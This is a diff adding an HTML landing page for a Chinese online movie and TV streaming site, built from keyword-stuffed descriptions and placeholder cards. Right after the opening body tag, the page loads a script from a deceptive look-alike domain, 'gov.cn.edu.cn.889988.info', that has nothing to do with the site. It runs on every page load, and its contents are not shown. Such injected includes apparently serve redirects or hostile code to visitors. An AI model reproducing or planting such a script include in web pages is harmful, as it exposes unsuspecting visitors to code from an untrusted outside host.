@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>被窝电影网 - 高清影视在线观看</title>
+<meta name="description" content="被窝电影网(beiwodianyingwang-h5)提供最新高清电影、电视剧、综艺、动漫在线观看，资源丰富，更新及时，移动端自适应，畅享观影体验。">
+<meta name="keywords" content="被窝电影网, beiwodianyingwang-h5, 高清电影, 在线观看, 电影网站">
+<link rel="canonical" href="https://beiwodianyingwang-h5">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Microsoft YaHei", Arial, sans-serif;
+}
+
+body {
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    color: #e5e5e5;
+    line-height: 1.6;
+}
+
+a {
+    color: #ffcc00;
+    text-decoration: none;
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+/* 顶部导航 */
+header {
+    background: rgba(0, 0, 0, 0.75);
+    padding: 15px 20px;
+    position: fixed;
+    width: 100%;
+    top: 0;
+    z-index: 999;
+    backdrop-filter: blur(6px);
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo {
+    font-size: 22px;
+    font-weight: bold;
+    color: #ffcc00;
+}
+
+nav ul {
+    list-style: none;
+    display: flex;
+    gap: 20px;
+}
+
+nav ul li a {
+    color: #fff;
+    font-size: 15px;
+}
+
+/* 主体 */
+.container {
+    max-width: 1200px;
+    margin: 100px auto 40px;
+    padding: 0 20px;
+}
+
+/* 栏目通用 */
+.section {
+    margin-bottom: 60px;
+}
+
+.section h2 {
+    font-size: 26px;
+    margin-bottom: 20px;
+    color: #ffcc00;
+    border-left: 5px solid #ffcc00;
+    padding-left: 12px;
+}
+
+/* 卡片 */
+.card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: 20px;
+}
+
+.card {
+    background: rgba(255,255,255,0.08);
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform 0.3s;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+}
+
+.card img {
+    width: 100%;
+    height: 220px;
+    object-fit: cover;
+    display: block;
+}
+
+.card-title {
+    padding: 10px;
+    font-size: 14px;
+    text-align: center;
+}
+
+/* 关于栏目 */
+.about p {
+    margin-bottom: 12px;
+    font-size: 15px;
+}
+
+/* 底部 */
+footer {
+    background: rgba(0,0,0,0.8);
+    text-align: center;
+    padding: 20px;
+    font-size: 13px;
+    color: #aaa;
+}
+
+/* 移动端自适应 */
+@media (max-width: 768px) {
+    .nav-container {
+        flex-direction: column;
+        gap: 10px;
+    }
+
+    nav ul {
+        flex-wrap: wrap;
+        justify-content: center;
+    }
+
+    .container {
+        margin-top: 130px;
+    }
+
+    .section h2 {
+        font-size: 22px;
+    }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header>
+    <div class="nav-container">
+        <div class="logo">被窝电影网</div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#movies">电影</a></li>
+                <li><a href="#tv">电视剧</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<div class="container">
+
+    <!-- 首页 -->
+    <section id="home" class="section">
+        <h2>欢迎访问 被窝电影网</h2>
+        <p style="margin-bottom:20px;">
+            官方网址：<a href="https://beiwodianyingwang-h5">https://beiwodianyingwang-h5</a>
+        </p>
+        <div class="card-grid">
+            <div class="card">
+                <img src="#" alt="电影封面">
+                <div class="card-title">热门电影推荐</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电视剧封面">
+                <div class="card-title">热播电视剧</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="综艺封面">
+                <div class="card-title">最新综艺节目</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="动漫封面">
+                <div class="card-title">经典动漫合集</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电影 -->
+    <section id="movies" class="section">
+        <h2>电影频道</h2>
+        <div class="card-grid">
+            <div class="card">
+                <img src="#" alt="电影">
+                <div class="card-title">动作大片</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电影">
+                <div class="card-title">喜剧搞笑</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电影">
+                <div class="card-title">爱情剧情</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电影">
+                <div class="card-title">科幻悬疑</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电视剧 -->
+    <section id="tv" class="section">
+        <h2>电视剧频道</h2>
+        <div class="card-grid">
+            <div class="card">
+                <img src="#" alt="电视剧">
+                <div class="card-title">国产剧</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电视剧">
+                <div class="card-title">美剧</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电视剧">
+                <div class="card-title">韩剧</div>
+            </div>
+            <div class="card">
+                <img src="#" alt="电视剧">
+                <div class="card-title">日剧</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于我们 -->
+    <section id="about" class="section about">
+        <h2>关于 被窝电影网</h2>
+        <p>
+            <strong>被窝电影网</strong>（<a href="https://beiwodianyingwang-h5">beiwodianyingwang-h5</a>）
+            是一个专注于高清影视在线观看的网站，致力于为用户提供丰富、稳定、流畅的观影体验。
+        </p>
+        <p>
+            网站涵盖电影、电视剧、综艺、动漫等多种资源，支持手机、平板、电脑多端自适应访问。
+        </p>
+        <p>
+            关键词：被窝电影网、beiwodianyingwang-h5、高清影视、在线观看
+        </p>
+    </section>
+
+</div>
+
+<footer>
+    © 2026 被窝电影网 | 网址：
+    <a href="https://beiwodianyingwang-h5">https://beiwodianyingwang-h5</a>
+</footer>
+
+</body>
+</html>
